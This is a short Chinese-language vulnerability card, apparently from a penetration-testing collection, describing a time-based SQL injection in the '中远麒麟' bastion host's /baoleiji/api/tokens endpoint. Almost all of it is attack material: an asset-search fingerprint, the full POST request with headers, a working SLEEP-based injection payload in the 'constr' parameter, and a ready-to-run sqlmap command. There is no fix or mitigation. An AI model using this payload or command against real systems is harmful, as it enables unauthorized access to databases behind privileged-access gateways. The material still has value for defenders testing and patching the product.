# 中远麒麟堡垒机tokensSQL注入漏洞

- **系统**：中远麒麟堡垒机tokens　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"Baolei"`
- **请求**：`POST /baoleiji/api/tokens HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: PHPSESSID=66b53a13d3db0e27a9676d419c374c42`　`Sec-Fetch-User: ?1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 91`

**请求体 / payload**
```
constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(10)))ptGN) AND'AAdm'='AAdm&title=%40127.0.0.1

```

**其他**
- 中远麒麟堡垒机tokensSQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 中远麒麟堡垒机
- sqlmap: ```plain
sqlmap -u 'https://xx.xx.xx.xx/baoleiji/api/tokens' --data='constr=1&title=%40127.0.0.1'
```
> 原文: <公众号：渗透安全HackTwo>